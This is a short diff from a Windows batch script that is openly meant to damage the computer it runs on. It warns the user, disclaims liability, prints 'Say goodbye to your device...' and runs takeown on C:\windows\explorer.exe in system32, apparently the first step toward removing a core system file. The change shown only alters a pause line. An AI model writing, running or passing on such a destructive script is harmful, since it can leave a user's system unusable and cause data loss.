@@ -19,7 +19,7 @@ echo This script should ask for administrator priveliges. Granting these will re
 echo im not responsible for any damages to ur pc
 echo ==========================================================
 echo Are you sure?
-pause > NUL
+pause 
 echo Say goodbye to your device...
 cd C:\windows\system32
 takeown /f C:\windows\explorer.exe
